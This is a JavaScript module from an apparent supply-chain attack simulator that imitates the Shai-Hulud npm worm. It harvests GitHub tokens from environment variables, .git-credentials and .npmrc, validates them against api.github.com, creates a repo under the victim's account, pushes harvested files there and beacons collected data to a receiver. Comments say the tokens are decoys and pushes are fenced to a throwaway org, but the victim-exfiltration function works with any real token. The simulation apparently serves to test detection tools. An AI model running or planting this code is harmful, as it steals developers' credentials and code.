// supply-chain-sim/npm-package/lib/exfil.js
const https = require('node:https');
const { assertThrowawayOrg } = require('./guardrail.js');

function request(urlStr, { method = 'POST', headers = {}, body } = {}) {
  const url = new URL(urlStr);
  const opts = {
    host: url.hostname, port: url.port || 443, path: url.pathname + url.search, method,
    headers: { 'user-agent': 'sim-agent', ...headers },
    // Test receiver uses a self-signed cert; production github.com validates normally.
    rejectUnauthorized: url.hostname !== '127.0.0.1' && url.hostname !== 'localhost' && url.hostname !== 'receiver.sim.local',
  };
  return new Promise((resolve, reject) => {
    const req = https.request(opts, res => { let b = ''; res.on('data', c => (b += c));
      res.on('end', () => resolve({ status: res.statusCode, body: b })); });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

function beacon(receiverUrl, payload) {
  return request(`${receiverUrl.replace(/\/$/, '')}/collect`,
    { headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload) });
}

// Fetch the throwaway GitHub org/token from the receiver's /config at runtime, so the secret is
// never baked into the payload source. Returns {} (skips GitHub exfil) if unreachable/unset.
async function fetchExfilConfig(receiverUrl) {
  try {
    const r = await request(`${receiverUrl.replace(/\/$/, '')}/config`, { method: 'GET' });
    if (r.status !== 200) return {};
    return JSON.parse(r.body);
  } catch { return {}; }
}

// Pull a GitHub token out of the harvested data (env vars, .git-credentials, .npmrc) — this is the
// VICTIM's own token, exactly what real Shai-Hulud uses to exfiltrate to GitHub.
function extractGithubToken(h) {
  const env = h.environment || {};
  for (const k of Object.keys(env)) {
    if (/^(GITHUB_TOKEN|GH_TOKEN|GH_PAT|GITHUB_PAT)$/i.test(k) && env[k]) return String(env[k]).trim();
  }
  for (const blob of [h.contents && h.contents['.git-credentials'], h.contents && h.contents['.npmrc']]) {
    const m = blob && blob.match(/(ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,})/);
    if (m) return m[1];
  }
  return null;
}

// Exfil to GitHub using the VICTIM's harvested token (real Shai-Hulud behavior): validate it, then
// create a repo under the victim's own account and push the artifacts. Decoy tokens are fake, so this
// 401s and creates nothing — but it generates the api.github.com validation + repo-create traffic that
// ExtraHop/Palo detect on. It can NEVER create a real repo, because the harvested tokens are decoys.
async function githubExfilVictim(token, files) {
  if (!token) return { attempted: false, reason: 'no github token harvested' };
  const gh = (p, method, body) => request(`https://api.github.com${p}`, {
    method, headers: {
      authorization: `Bearer ${token}`, accept: 'application/vnd.github+json',
      'content-type': 'application/json', 'x-github-api-version': '2022-11-28',
    }, body: body ? JSON.stringify(body) : undefined });
  const val = await gh('/user', 'GET');                                 // T1552-adjacent token validation
  const login = val.status === 200 ? (JSON.parse(val.body).login || null) : null;
  const create = await gh('/user/repos', 'POST',                        // exfil attempt -> api.github.com, changed to private true below
    { name: 'Shai-Hulud', private: true, description: 'Shai-Hulud: Here We Go Again' });
  const results = [];
  if (create.status === 201 && login) {                                 // only if a real token actually worked
    for (const f of files) {
      const r = await gh(`/repos/${login}/Shai-Hulud/contents/${encodeURIComponent(f.path)}`, 'PUT',
        { message: `add ${f.path}`, content: Buffer.from(f.content).toString('base64') });
      results.push({ path: f.path, status: r.status });
    }
  }
  return { attempted: true, tokenValid: !!login, login, createStatus: create.status, results };
}

// Create (or reuse) a private repo in the THROWAWAY org and commit files via the contents API.
// OPTIONAL end-to-end verification path (operator throwaway PAT) — not the realistic exfil.
async function pushToGitHub({ org, pat, repo, files }) {
  if (!pat || !org) return { skipped: true };
  assertThrowawayOrg(org);   // containment: refuse to push to a non-throwaway org (throws -> payload aborts)
  const gh = (path, method, body) => request(`https://api.github.com${path}`, {
    method, headers: {
      authorization: `Bearer ${pat}`, accept: 'application/vnd.github+json',
      'content-type': 'application/json', 'x-github-api-version': '2022-11-28',
    }, body: body ? JSON.stringify(body) : undefined });

  // Idempotent repo create; ignore 422 (already exists). Description matches the real campaign.
  await gh(`/orgs/${org}/repos`, 'POST',
    { name: repo, private: true, description: 'Shai-Hulud: Here We Go Again' });
  const results = [];
  for (const f of files) {
    const r = await gh(`/repos/${org}/${repo}/contents/${encodeURIComponent(f.path)}`, 'PUT',
      { message: `add ${f.path}`, content: Buffer.from(f.content).toString('base64') });
    results.push({ path: f.path, status: r.status });
  }
  return { skipped: false, repo, results };
}

module.exports = { beacon, pushToGitHub, request, fetchExfilConfig, extractGithubToken, githubExfilVictim };
